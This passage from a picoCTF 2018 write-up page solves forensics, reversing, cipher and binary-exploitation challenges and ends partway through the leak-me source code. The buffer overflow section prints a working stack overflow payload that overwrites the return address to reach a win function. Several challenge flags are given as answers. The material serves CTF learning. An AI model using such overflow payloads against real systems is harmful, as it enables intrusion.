</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{s3cr3t_ag3nt_m4n_134ecd62} </code><hr><h1 id="forensics-200-truly-an-artist"> Forensics 200: Truly an Artist <a href="/CTF-writeups-public/writeups/PicoCTF_2018/35-forensics-200-truly-an-artist.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you help us find the flag in this <a href="./writeupfiles/2018.png">Meta-Material</a>?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>$ exiftool writeupfiles/2018.png
ExifTool Version Number         : 10.10
File Name                       : 2018.png
Directory                       : writeupfiles
File Size                       : 13 kB
File Modification Date/Time     : 2018:09:29 11:37:17+02:00
File Access Date/Time           : 2018:09:29 11:37:17+02:00
File Inode Change Date/Time     : 2018:09:29 11:37:33+02:00
File Permissions                : rw-rw----
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1200
Image Height                    : 630
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Artist                          : picoCTF{look_in_image_788a182e}
Image Size                      : 1200x630
Megapixels                      : 0.756
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{look_in_image_788a182e} </code><hr><h1 id="reversing-200-assembly-1"> Reversing 200: assembly-1 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/36-reversing-200-assembly-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What does <code class="language-plaintext highlighter-rouge">asm1(0x76)</code> return? Submit the flag as a hexadecimal value (starting with <code class="language-plaintext highlighter-rouge">0x</code>).</p><p>NOTE: Your submission for this question will NOT be in the normal flag format.<br /> Source located in the directory at <code class="language-plaintext highlighter-rouge">/problems/assembly-1_0_cfb59ef3b257335ee403035a6e42c2ed</code>.</p><p><a href="writeupfiles/eq_asm_rev.S">asm1</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><pre><code class="language-asm">intel_syntax noprefix
.bits 32

.global asm1

asm1:
	push	ebp
	mov	ebp,esp
	cmp	DWORD PTR [ebp+0x8],0x98
	jg 	part_a
	cmp	DWORD PTR [ebp+0x8],0x8
	jne	part_b
	mov	eax,DWORD PTR [ebp+0x8]
	add	eax,0x3
	jmp	part_d
part_a:
	cmp	DWORD PTR [ebp+0x8],0x16
	jne	part_c
	mov	eax,DWORD PTR [ebp+0x8]
	sub	eax,0x3
	jmp	part_d
part_b:
	mov	eax,DWORD PTR [ebp+0x8]
	sub	eax,0x3
	jmp	part_d
	cmp	DWORD PTR [ebp+0x8],0xbc
	jne	part_c
	mov	eax,DWORD PTR [ebp+0x8]
	sub	eax,0x3
	jmp	part_d
part_c:
	mov	eax,DWORD PTR [ebp+0x8]
	add	eax,0x3
part_d:
	pop	ebp
	ret
</code></pre><p>we manually parse this code:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>asm1:                              ; 1: we start here
	push	ebp
	mov	ebp,esp
	cmp	DWORD PTR [ebp+0x8],0x98   ; 2: we compare our input value (`0x76`) to `0x98`
	jg 	part_a	                   ; 3: not greater than `0x98` so we do not jump
	cmp	DWORD PTR [ebp+0x8],0x8    ; 4: now compare to `0x8`
	jne	part_b                     ; 5: not equal so we jump to part_b
	mov	eax,DWORD PTR [ebp+0x8]
	add	eax,0x3
	jmp	part_d
part_a:
	cmp	DWORD PTR [ebp+0x8],0x16
	jne	part_c
	mov	eax,DWORD PTR [ebp+0x8]
	sub	eax,0x3
	jmp	part_d
part_b:
	mov	eax,DWORD PTR [ebp+0x8]   ; 6: load our input value (`0x76`) to eax
	sub	eax,0x3                   ; 7: subtract 3, eax now contains `0x73`
	jmp	part_d                    ; 8: we jump to part_d
	cmp	DWORD PTR [ebp+0x8],0xbc
	jne	part_c
	mov	eax,DWORD PTR [ebp+0x8]
	sub	eax,0x3
	jmp	part_d
part_c:
	mov	eax,DWORD PTR [ebp+0x8]
	add	eax,0x3
part_d:
	pop	ebp
	ret                          ; 9: return value in eax (`0x73`)
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="reversing-200-be-quick-or-be-dead-1"> Reversing 200: be-quick-or-be-dead-1 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/37-reversing-200-be-quick-or-be-dead-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You find <a href="https://www.youtube.com/watch?v=CTt1vk9nM9c">this</a> when searching for some music, which leads you to <a href="writeupfiles/be-quick-or-be-dead-1">be-quick-or-be-dead-1</a>. Can you run it fast enough?</p><p>You can also find the executable in <code class="language-plaintext highlighter-rouge">/problems/be-quick-or-be-dead-1_3_aeb48854203a88fb1da963f41ae06a1c</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ ./be-quick-or-be-dead-1
Be Quick Or Be Dead 1
=====================

Calculating key...
You need a faster machine. Bye bye.
</pre></table></code></div></div><p>ok, sounds like we need to speed up the execution of the program. We examine it with objdump and find<br /> this functions that wastes a lot of time:</p><pre><code class="language-asm">0000000000400706 &lt;calculate_key&gt;:
  400706:       55                      push   %rbp
  400707:       48 89 e5                mov    %rsp,%rbp
  40070a:       c7 45 fc 3c 7e d4 6f    movl   $0x6fd47e3c,-0x4(%rbp)
  400711:       83 45 fc 01             addl   $0x1,-0x4(%rbp)
  400715:       81 7d fc 78 fc a8 df    cmpl   $0xdfa8fc78,-0x4(%rbp)
  40071c:       75 f3                   jne    400711 &lt;calculate_key+0xb&gt;
  40071e:       8b 45 fc                mov    -0x4(%rbp),%eax
  400721:       5d                      pop    %rbp
  400722:       c3                      retq
</code></pre><p>This function sets a value of <code class="language-plaintext highlighter-rouge">0x6fd47e3c</code>, then repeatedly adds 1 to this value until<br /> it becomes equal to <code class="language-plaintext highlighter-rouge">0xdfa8fc78</code> ..if we edit the intial value to be <code class="language-plaintext highlighter-rouge">0xdfa8fc77</code> it<br /> will be much faster while still reaching the same final state. We can do this with<br /> a hex editor</p><p><img src="writeupfiles/be-quick-hex.png" alt="" /></p><p>we save, and run the program again:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$ ./be-quick-or-be-dead-1
Be Quick Or Be Dead 1
=====================

Calculating key...
Done calculating key
Printing flag:
picoCTF{why_bother_doing_unnecessary_computation_27f28e71}
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{why_bother_doing_unnecessary_computation_27f28e71} </code><hr><h1 id="cryptography-200-blaise-s-cipher"> Cryptography 200: blaise’s cipher <a href="/CTF-writeups-public/writeups/PicoCTF_2018/38-cryptography-200-blaises-cipher.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>My buddy Blaise told me he learned about this cool cipher invented by a guy also named Blaise! Can you figure out what it says?</p><p>Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 46966</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We connect and are greeted by this message:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>Yse lncsz bplr-izcarpnzjo dkxnroueius zf g uzlefwpnfmeznn cousex bls ltcmaqltki my Rjzn Hfetoxea Gqmexyt axtfnj 1467 fyd axpd g rptgq nivmpr jndc zt dwoynh hjewkjy cousex fwpnfmezx. Llhjcto'x dyyypm uswy ybttimpd gqahggpty fqtkw debjcar bzrjx, lnj xhizhsey bprk nydohltki my cwttosr tnj wezypr uk ehk hzrxjdpusoitl llvmlbky tn zmp cousexypxz. Qltkw, tn 1508, Ptsatsps Zwttnjxiax, tn nnd wuwv Puqtgxfahof, tnbjytki ehk ylbaql rkhea, g hciznnar hzmvtyety zf zmp Volpnkwp cousex. Yse Zwttnjxiax nivmpr, nthebjc, otqj pxtgijjo a vwzgxjdsoap, roltd, gso pxjoiiylbrj dyyypm ltc scnecnnyg hjewkjy cousex fwpnfmezx.

Hhgy ts tth ktthn gx ehk Atgksprk htpnjc wgx zroltngqwy jjdcxnmej gj Gotgat Gltzndtg Gplrfdo os siy 1553 gzoq Ql cokca jjw. Sol. Riualn Hfetoxea Hjwlgxz. Hk gfiry fpus ehk ylbaql rkhea uk Eroysesnfs, hze ajipd g wppkfeitl "noaseexxtgt" (f vee) yz scnecn htpnjc arusahjes kapre qptzjc. Wnjcegx Llhjcto fyd Zwttnjxiax fski l focpd vfetkwy ol xfbyyttaytotx, Merqlsu'x dcnjxe sjlnz yse vfetkwy ol xfbyyttaytotx noaqo bk jlsoqj cnfygki disuwy hd derjntosr a tjh kkd. Veex hexj eyvnnarqj sosrlk bzrjx zr ymzrz usrgxps, qszwt yz buys pgweikx tn gigathp, ox ycatxxizypd "uze ol glnj" fwotl hizm ehk rpsyfre. Hjwlgxz's sjehui ehax cewztrki dtxtyg yjnuxney ltc otqj tnj vee. Fd iz nd rkqltoaple jlse yz skhfrk f dhuwe kkd ahxfde, yfj be f arkatoax aroaltk hznbjcsgytot, Gplrfdo'y xjszjx wgx notxtdkwlbrd xoxj deizce.

Hqliyj oe Bnretjce vzmloxsej mts jjdcxnatoty ol f disnwax gft yycotlpr gzeoqjj cousex gpfuwp tnj noawe ol Mpnxd TIO tq Fxfyck, ny 1586. Lgypr, os ehk 19ys ckseuxd, ehk nyvkseius zf Hjwlgxz's inahkw hay rtsgyerogftki eo Bnretjce. Jfgij Plht ny hox moup Ehk Hzdkgcegppry qlmkseej yse sndazycihzeius my yfjitl ehgy siyyzre mld "olyoxjo tnnd isuzrzfyt itytxnmuznzn gso itxeegi yasjo a xjrrkxdibj lnj jwesjytgwj cousex kzr nnx [Volpnkwp] tntfgn mp hgi yozmtnm yz du bttn ne". pohzCZK{g1gt3w3_n1pn3wd_ax3s7_maj_hof08hk0}

Ehk Atgksprk htpnjc ggnyej f cevzeaznzn ltc bknyg kcnevytotfwle xerusr. Nuypd gzehuw lnj rltnjxaznnigs Nhgwwey Qftcnogk Izdmxzn (Rjhiy Hlrxtwl) ifwlki ehk Atgksprk htpnjc utgcegplbrj tn nnd 1868 pojne "Zmp Arusahje Cousex" ny a imtljwpn'y rlggetnk. Ny 1917, Sinpnznqii Fxexnnat ipsiwtbki ehk Atgksprk htpnjc ay "nxpuxdihqp ol ycatxwaznzn". Zmts xjauzfeius hay szt jjdexapd. Imlrrjd Bggmamj ts qszwt yz hgap bxtvet f gaxnlnz tq tnj nivmpr gx paxqj ay 1854; mzwkapr, nj oijs'e pagwiym siy bzrq. Plsoxvi kseixjwy hwzkk yse inahkw lnj ufbrndhki ehk ypcnstqaj tn zmp 19tn hpnzzcy. Kapn hjqoxj ehox, ehuzrh, ytxe yptlrjo cxdatgsllexes itflj tncgxtotfwle gcegp ehk htpnjc it yse 16zm netyfre.

Hcyvyzgxfahoh dloip raqp uyjo ay f narhflgytot ftd hd ehk Xhiyx Lrsd mezbpet 1914 fyd 1940.
Zmp Volpnkwp cousex nd soralk jyoals tu gp a lnplj htpnjc il ne iy zdej ny cusuutheius hizm nivmpr jndky. Yse Ityfkiprgyp Szfeey tq Asjciif, qox jiasuwe, axpd g gcayx nivmpr jndk zt tmvqpmkse tnj Gimjyexj nivmpr jzcitl ehk Fxexnnat Htvoq Hax. Yse Ityfkiprghj's sjdsglps cjce lfc fxtx skhcez fyd zmp Utnzn xjrurfcle hcaippd zmpix rpsyfrey. Ysruzrhuze tnj hax, yse Ityfkiprgyp lkfoexxsiv ucisfcird cernpd auzn zmcek ppy vmcayjd, "Mgsnhkxeex Gwulk", "Nosuwezj Giiyzre" fyd, gx ehk blr ifxe zt l crtde, "Itxe Xjerogftoty".

Goqmexy Gexslm zwtej yz rkulix yse hwzkks nivmpr (iwpaznyg zmp Vkwyas–Atgksprk htpnjc it 1918), gft, tt xazypr cmlt nj oij, yse inahkw hay xeirq gursprggwe zt nreueatfwyynd. Vkwyas'x hoxp, socjgex, jgetyfarqj lki eo zmp otj-eisj aaj, f ehktceznnarqj utgcegplbrj nivmpr.
</pre></table></code></div></div><p>It is encrypted and we see something that clearly will be the flag. With <em>blaise</em> in the title, this has got to be Vigenere ciper.</p><p>We use <a href="">this site</a> to find the key, which turns out to be <code class="language-plaintext highlighter-rouge">FLAG</code>. The decrypted message is:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>The first well-documented description of a polyalphabetic cipher was formulated by Leon Battista Alberti around 1467 and used a metal cipher disc to switch between cipher alphabets. Alberti's system only switched alphabets after several words, and switches were indicated by writing the letter of the corresponding alphabet in the ciphertext. Later, in 1508, Johannes Trithemius, in his work Poligraphia, invented the tabula recta, a critical component of the Vigenere cipher. The Trithemius cipher, however, only provided a progressive, rigid, and predictable system for switching between cipher alphabets.

What is now known as the Vigenere cipher was originally described by Giovan Battista Bellaso in his 1553 book La cifra del. Sig. Giovan Battista Bellaso. He built upon the tabula recta of Trithemius, but added a repeating "countersign" (a key) to switch cipher alphabets every letter. Whereas Alberti and Trithemius used a fixed pattern of substitutions, Bellaso's scheme meant the pattern of substitutions could be easily changed simply by selecting a new key. Keys were typically single words or short phrases, known to both parties in advance, or transmitted "out of band" along with the message. Bellaso's method thus required strong security for only the key. As it is relatively easy to secure a short key phrase, say by a previous private conversation, Bellaso's system was considerably more secure.

Blaise de Vigenere published his description of a similar but stronger autokey cipher before the court of Henry III of France, in 1586. Later, in the 19th century, the invention of Bellaso's cipher was misattributed to Vigenere. David Kahn in his book The Codebreakers lamented the misattribution by saying that history had "ignored this important contribution and instead named a regressive and elementary cipher for him [Vigenere] though he had nothing to do with it". picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_cdf08bf0}

The Vigenere cipher gained a reputation for being exceptionally strong. Noted author and mathematician Charles Lutwidge Dodgson (Lewis Carroll) called the Vigenere cipher unbreakable in his 1868 piece "The Alphabet Cipher" in a children's magazine. In 1917, Scientific American described the Vigenere cipher as "impossible of translation". This reputation was not deserved. Charles Babbage is known to have broken a variant of the cipher as early as 1854; however, he didn't publish his work. Kasiski entirely broke the cipher and published the technique in the 19th century. Even before this, though, some skilled cryptanalysts could occasionally break the cipher in the 16th century.

Cryptographic slide rule used as a calculation aid by the Swiss Army between 1914 and 1940.
The Vigenere cipher is simple enough to be a field cipher if it is used in conjunction with cipher disks. The Confederate States of America, for example, used a brass cipher disk to implement the Vigenere cipher during the American Civil War. The Confederacy's messages were far from secret and the Union regularly cracked their messages. Throughout the war, the Confederate leadership primarily relied upon three key phrases, "Manchester Bluff", "Complete Victory" and, as the war came to a close, "Come Retribution".

Gilbert Vernam tried to repair the broken cipher (creating the Vernam–Vigenere cipher in 1918), but, no matter what he did, the cipher was still vulnerable to cryptanalysis. Vernam's work, however, eventually led to the one-time pad, a theoretically unbreakable cipher.
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_cdf08bf0} </code><hr><h1 id="binary-exploitation-200-buffer-overflow-1"> Binary Exploitation 200: buffer overflow 1 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/39-binary-exploitation-200-buffer-overflow-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Okay now you’re cooking! This time can you overflow the buffer and return to the flag function in this program? You can find it in /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba on the shell server. <a href="writeupfiles/vuln-buff-overflow-1.c">Source.</a></p><p><strong>Solution</strong><br /> Using an entirely manual binary search we find out which bytes we actually control:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>hxr@pico-2018-shell-1:/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba$ ./vuln
Please enter your string:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
Okay, time to return... Fingers Crossed... Jumping to 0x62616161
Segmentation fault
...
hxr@pico-2018-shell-1:/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba$ ./vuln
Please enter your string:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadcba
Okay, time to return... Fingers Crossed... Jumping to 0x61626364
Segmentation fault
</pre></table></code></div></div><p>Ok, good. Now we have control of the return, we just need to point it to wherever the flag is printed? I guess that’s the win function</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>$ objdump -x -d vuln
....

080485cb &lt;win&gt;:
 80485cb:       55                      push   %ebp
 80485cc:       89 e5                   mov    %esp,%ebp
 80485ce:       83 ec 58                sub    $0x58,%esp
 80485d1:       83 ec 08                sub    $0x8,%esp
 80485d4:       68 50 87 04 08          push   $0x8048750
 80485d9:       68 52 87 04 08          push   $0x8048752
 80485de:       e8 bd fe ff ff          call   80484a0 &lt;fopen@plt&gt;
 80485e3:       83 c4 10                add    $0x10,%esp
 80485e6:       89 45 f4                mov    %eax,-0xc(%ebp)
 80485e9:       83 7d f4 00             cmpl   $0x0,-0xc(%ebp)
 80485ed:       75 1a                   jne    8048609 &lt;win+0x3e&gt;
 80485ef:       83 ec 0c                sub    $0xc,%esp
...
</pre></table></code></div></div><p>So we want to return to <code class="language-plaintext highlighter-rouge">0x080485cb</code></p><p>First I experimented with some known characters in order to figure out the byte<br /> mapping because little endian doesn’t work with <code class="language-plaintext highlighter-rouge">xxd -r</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>$ echo -n 'ÏÖ' | xxd -e # Little endian
00000000: 96c38fc3                             ....
$ echo -n 'ÏÖ' | xxd    # Big endian
00000000: c38f c396                                ....
$ # 080485cb &lt; our target string
$ echo '00000000: cb85 0408' | xxd -r
$ # And the mapping is a bunch of unprintable characters.
</pre></table></code></div></div><p>This needs to be prefixed with a known length of buffer so we’ll just construct something xxd is happy with:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>00000000: 61616161 61616161 61616161 61616161
00000010: 61616161 61616161 61616161 61616161
00000020: 61616161 61616161 61616161 cb850408
</pre></table></code></div></div><p>And then run this on the server:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ echo '00000000: 61616161 61616161 61616161 61616161
00000010: 61616161 61616161 61616161 61616161
00000020: 61616161 61616161 61616161 cb850408' | xxd -r | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy56a7b196}Segmentation fault
</pre></table></code></div></div><p>It works!!!</p><h2> Flag</h2><code> picoCTF{addr3ss3s_ar3_3asy56a7b196}Segmentation fault </code><hr><h1 id="cryptography-200-hertz-2"> Cryptography 200: hertz 2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/40-cryptography-200-hertz-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This flag has been encrypted with some kind of cipher, can you decrypt it? Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 12521</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When we connect we are given a ciphertext</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Yln mvsfi ugbxe abj tvkow bcng yln qrzd pbh. S fre'y unqsncn ylsw sw wvfl re nrwd ogbuqnk se Osfb. Sy'w rqkbwy rw sa S wbqcnp r ogbuqnk rqgnrpd! Bird, asen. Lngn'w yln aqrh: osfbFYA{wvuwysyvysbe_fsolngw_rgn_ybb_nrwd_whwhyeosub}
</pre></table></code></div></div><p>we input this to https://quipqiup.com/ and it decodes to</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>The quick brown fox jumps over the lazy dog. I can't believe this is such an easy problem in Pico. It's almost as if I solved a problem already! Okay, fine. Here's the flag: picoCTF{substitution_ciphers_are_too_easy_sgsgtnpibo}
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{substitution_ciphers_are_too_easy_sgsgtnpibo} </code><hr><h1 id="binary-exploitation-200-leak-me"> Binary Exploitation 200: leak-me <a href="/CTF-writeups-public/writeups/PicoCTF_2018/41-binary-exploitation-200-leak-me.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you authenticate to <a href="writeupfiles/auth">this service</a> and get the flag? Connect with nc 2018shell1.picoctf.com 31045.</p><p><a href="writeupfiles">Source</a></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">flag</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
  <span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">file</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="c1">// Set the gid to the effective gid</span>
  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>

  <span class="c1">// real pw:</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">password_input</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">password</span><span class="p">));</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">name</span><span class="p">));</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">password_input</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">password_input</span><span class="p">));</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"What is your name?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

